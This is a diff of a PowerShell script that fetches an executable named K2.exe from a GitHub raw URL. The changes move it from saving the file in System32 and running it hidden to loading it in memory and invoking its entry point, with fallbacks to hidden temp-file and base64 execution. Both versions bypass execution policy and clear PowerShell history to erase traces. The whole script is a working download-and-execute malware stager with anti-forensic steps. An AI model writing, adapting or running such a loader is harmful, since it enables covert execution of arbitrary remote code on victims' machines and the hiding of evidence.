@@ -1,55 +1,71 @@
-# PowerShell Script to Download, Save, Run EXE Silently, and Clear History
-# WARNING: This script requires Administrator privileges to write to System32.
+# PowerShell Script to Download and Run EXE in Memory
+# WARNING: This script requires Administrator privileges.
 # Running unknown EXEs can be dangerous - use at your own risk!
 
 try {
     # Bypass execution policy for CurrentUser
     Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force -ErrorAction SilentlyContinue
 
-    # Define paths and URL (use raw GitHub URL for direct download)
+    # Define URL
     $exeUrl = "https://raw.githubusercontent.com/HACKx99/WebSite/main/K2.exe"
-    $system32Path = "$env:windir\System32\K2.exe"
     $historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 
-    # Download the EXE to System32
-    Write-Output "Downloading EXE from $exeUrl..."
-    Invoke-WebRequest -Uri $exeUrl -OutFile $system32Path -UseBasicParsing
+    Write-Output "Downloading EXE into memory..."
+    
+    # Download EXE as byte array directly into memory
+    $webClient = New-Object System.Net.WebClient
+    $exeBytes = $webClient.DownloadData($exeUrl)
+    $webClient.Dispose()
 
-    # Verify download
-    if (Test-Path $system32Path) {
-        Write-Output "EXE downloaded successfully to $system32Path"
+    if ($exeBytes.Length -eq 0) {
+        throw "Download failed - no data received"
+    }
+
+    Write-Output "EXE downloaded successfully ($($exeBytes.Length) bytes)"
+
+    # Method 1: Load and execute assembly in memory
+    try {
+        Write-Output "Attempting to load and run EXE in memory..."
+        $assembly = [System.Reflection.Assembly]::Load($exeBytes)
+        $entryPoint = $assembly.EntryPoint
         
-        # Wait a moment to ensure file is completely written
-        Start-Sleep -Seconds 2
-        
-        # Method 1: Start process with hidden window
-        Write-Output "Attempting to run EXE..."
-        $process = Start-Process -FilePath $system32Path -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue
-        
-        # Method 2: Alternative approach using cmd
-        if (-not $process -or $process.HasExited) {
-            Write-Output "Trying alternative method to run EXE..."
-            cmd.exe /c start "" "$system32Path" 2>$null
-        }
-        
-        # Method 3: Using WMI if other methods fail
-        Start-Sleep -Seconds 3
-        $running = Get-Process -Name "K2" -ErrorAction SilentlyContinue
-        if (-not $running) {
-            Write-Output "Trying WMI method..."
-            Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $system32Path
-        }
-        
-        # Verify the process is running
-        Start-Sleep -Seconds 2
-        $runningProcess = Get-Process -Name "K2" -ErrorAction SilentlyContinue
-        if ($runningProcess) {
-            Write-Output "EXE is running successfully (PID: $($runningProcess.Id))"
+        if ($entryPoint) {
+            Write-Output "Found entry point: $($entryPoint.Name)"
+            $entryPoint.Invoke($null, $null)
         } else {
-            Write-Warning "EXE started but may have exited quickly"
+            throw "No entry point found in assembly"
         }
-    } else {
-        throw "Download failed - file not found at $system32Path"
+    }
+    catch {
+        Write-Warning "Assembly load method failed: $($_.Exception.Message)"
+        
+        # Method 2: Save temporarily to temp folder and execute
+        Write-Output "Trying temporary file method..."
+        $tempPath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), [System.Guid]::NewGuid().ToString() + ".exe")
+        
+        try {
+            [System.IO.File]::WriteAllBytes($tempPath, $exeBytes)
+            
+            if (Test-Path $tempPath) {
+                Write-Output "Running EXE from temporary location..."
+                $process = Start-Process -FilePath $tempPath -WindowStyle Hidden -PassThru -Wait
+                Write-Output "EXE execution completed"
+                
+                # Clean up temporary file
+                Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
+                Write-Output "Temporary file cleaned up"
+            }
+        }
+        catch {
+            Write-Warning "Temporary file method failed: $($_.Exception.Message)"
+            
+            # Method 3: Use Invoke-Expression with base64 (for .NET assemblies)
+            Write-Output "Trying base64 execution method..."
+            $base64String = [Convert]::ToBase64String($exeBytes)
+            $assembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($base64String))
+            $entryPoint = $assembly.EntryPoint
+            $entryPoint.Invoke($null, $null)
+        }
     }
 
     # Forcefully clear PowerShell history
@@ -61,14 +77,11 @@ try {
     }
     Set-PSReadLineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
 
-    Write-Output "Script executed successfully. EXE downloaded to System32 and run. History cleared."
+    Write-Output "Script executed successfully. EXE run in memory. History cleared."
+
 } catch {
     Write-Error "Error: $($_.Exception.Message)"
     exit 1
 } finally {
-    # Optional: Self-delete if saved as .ps1 (uncomment if needed)
-    # if ($MyInvocation.MyCommand.Path) { 
-    #     Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue 
-    # }
     exit 0
 }
